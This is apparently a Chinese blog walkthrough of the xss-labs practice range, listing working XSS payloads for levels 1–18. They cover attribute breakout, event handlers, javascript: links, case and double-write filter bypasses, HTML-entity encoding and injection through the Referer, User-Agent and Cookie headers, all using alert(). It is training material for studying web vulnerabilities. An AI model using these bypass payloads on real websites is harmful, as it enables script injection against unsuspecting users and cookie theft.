通过练习xsslabs可以熟练掌握XSS攻击的技巧 有助于更加深刻的理解XSS攻击的运用与流程

**xsslabs下载地址：https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master**

**无需安装 将之解压到WWW目录之后直接访问就可开始学习之旅**

**环境：Windows11**

　　　**PHPstudy2018**

**背景知识：**

**跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！**

**XSS分为：存储型 、反射型 、DOM型XSS**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171059244-1552189861.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171059244-1552189861.png)[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171123929-1022275017.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171123929-1022275017.png)**

**存储型XSS：**存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie  
**反射型XSS：**非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。  
**DOM型XSS：**不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。

**Level1：不使用过滤器**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171336317-153860004.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171336317-153860004.png)**

简单观察知道是反射型XSS 通过get传参然后显示在页面

在name参数后面写上payload：**<script>alert("XSS")</script>**

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171723272-1290362791.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171723272-1290362791.png)

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171741700-358139756.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115171741700-358139756.png)

 **Level2：闭合标签**

这一关依旧正常输入 可以看到没有成功 F12

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115172913285-651125184.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115172913285-651125184.png)

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115173013895-651226604.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115173013895-651226604.png)

 这里是将输入的文字添加到了value这个属性中，可以采用闭合input标签完成XSS攻击

**payload："><script>alert("xss")</script>**

**因为">闭合了input标签  最终的语句为 <input name="keyword" value=""> **<script>alert("xss")</script>****

**Level3：单引号闭合并添加事件**
```js
//构造pyload如下
' onmouseover=javascript:alert(1) '
```

输入text，查看网页源码

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115174512310-727863908.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115174512310-727863908.png)

 与Level2感觉相同 输入level2的payload 发现没有反应 查看源码

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115174703095-1905380443.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221115174703095-1905380443.png)

关键字符被编码成了html字符实体  这里可以通过<input>标签的一些特殊事件来执行js代码

**payload： ' onfocus=javascript:alert('xss') >**

　　　　　****' onfocus=javascript:alert('xss')//****

输入之后发现没有反应 因为这个属性是要光标接触才发生，将光标移动到输入框然后点击就完成level3

**Level4：双引号闭合并添加事件**

**第四关与第三关相同 只不过闭合引号变成了双引号**

**payload： " onfocus=javascript:alert('xss')//**

　　　　　****" onfocus=javascript:alert('xss') "****

**Level5：javascript伪协议**

随便输入：xss看源代码

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116163750334-486612476.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116163750334-486612476.png)

在输入payload：<script>alert('xss')</script>

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116163914835-139601075.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116163914835-139601075.png)

 <  > 被编码 script被替换 改用上一关的方法

 [![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116164103595-154159099.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116164103595-154159099.png)

onfocus 也被替换 这个时候采取另外一种html标签进行攻击

 **payload："> <a href=javascript:alert('xss')>xss</a>//**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116164216358-2076268924.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116164216358-2076268924.png)**

出现链接 点击就可以完成挑战

 **Level6：大小写绕过**

采用上一关的payload 发现href被替换   **采取大写绕过**

**payload："> <a Href=javascript:alert('xss')>xss</a>//**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116165059694-999198646.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116165059694-999198646.png)**

******Level7：双写绕过******

这一关过滤了关键词 script on href等 **采取双写绕过**

**payload：" oonnfocus=javascscriptript:alert('xss')//**

　　　　   **"><scscriptript>alert("xss")</scscriptript>//**

　　　　　**"> <a hhrefref=javascscriptript:alert('xss')>xss</a>//**

**Level8：字符实体**

**这一关采取大小写 双写都无法绕过**

**javaSCscriptript:alert('xss')**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116174317401-1444882031.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116174317401-1444882031.png)**

 使用编码绕过概念，就是将所有字符编码为HTML实体

**HTML字符实体转化：https://www.qqxiuzi.cn/bianma/zifushiti.php**

将 **javascript:alert('xss')** 转化为实体字符

**payload：&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116174654735-773497418.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221116174654735-773497418.png)**

**Level：9  检测关键字存在**

利用前几关的payload发现都不行 查看源码

**分析：**我们发现这里多了一个`strpos`函数，这个函数是用来查找指定文本在字符串中第一次出现的位置，这时候我们就不得不在代码里加入`http://`，但是并没有过滤HTML实体编码，所以我们还是使用编码绕过

**方法：**使用过滤HTML实体编码，但是由于需要加入http://，肯定不能在http://后面加代码，必须在前面，并且将http://注释掉才能执行

**payload：&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x2F;&#x2F;http://**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117092048532-1213120572.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117092048532-1213120572.png)**

 **Level10：隐藏信息**

**分析：**这一关将之前的方法全部尝试 发现没有用  查看表单元素 发现有三个被隐藏的表单

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117094644171-1189637463.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117094644171-1189637463.png)

**方法：**可以尝试构造文本框来攻击 随机将三个输入框的其中一个type属性值更改为text  然后增加onclick=alert('xss') 属性

**payload：**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117095009933-694404094.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117095009933-694404094.png)**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117095034282-590487325.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117095034282-590487325.png)**

**Level11：Referer信息**

**PS：**这一关也可以用level10的方法完成 但是这样也就无法体验xsslabs的价值

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100208434-243405787.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100208434-243405787.png)

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100230391-504132551.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100230391-504132551.png)

**分析：**根据返回的html判断refer字符为Web页面的自定义变量 可能存在XSS

**payload：利用BP或者Hackbar修改Referer的值 这里我使用的Hackbar**

　**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100701742-1793749579.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117100701742-1793749579.png)**

**Level12：user-agent信息**

**PS：**我与上一关相类似 只不过从Referer换成了user-agent

[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102420371-1920634695.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102420371-1920634695.png)

 [![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102441259-443455038.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102441259-443455038.png)

 **payload：**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102743779-1819066637.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117102743779-1819066637.png)**

**" type="text" onmouseover=alert('xss')//**

**" type="text" onmouseover="alert('xss')"**

**Level13：Cookie信息**

**PS：**与前两关相类似 只不过换成了Cookie

**payload：user=" type= "text" onclick="alert('xss')"**

**Level14：exif xss**

_**网上查找发现题有问题 此关略过**_

**Level15：ng-include属性**

**payload：'level1.php?name="><a href="javascript:alert(/xss/)">xss</a>'**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117111632992-522912868.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117111632992-522912868.png)**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117111700326-73594306.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221117111700326-73594306.png)**

**Level16：%0A或%0D作为空格使用**

**空格、/、script都被str_replace函数替换成 了，但是在HTML中可以将%0a或者%0D当成空格使用**

**在keyword后面输入payload**

**payload：<a%0Ahref='javas%0Acript:alert("xss")'>xss  
**

　　　　　**<input%0Atype="text"%0Aonclick="alert('xss')">**

**Level17：参数拼接**

**PS：这一关不能使用火狐浏览器 我尝试多次无法完成 换其他的就好Edge**

**根据返回的代码判断，arg01和arg02提交的变量存在注入点**

**[![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221118092533322-871190676.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221118092533322-871190676.png)**

 [![](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221118092554078-1176705079.png)](https://img2022.cnblogs.com/blog/2607747/202211/2607747-20221118092554078-1176705079.png)

#注意在arg01这里要添加空格，不然就是将属性与之前的xsf01.swf?进行连接了

**payload：****arg01= onmousemove&arg02=javascript:alert(/xss/)**

　　　　　**arg01=q&arg02= onmouseover=alert("xss")**

**Level：18**

**与17关一模一样 相同的payload**

**Level：19——20**

**PS：涉及反编译 未完成**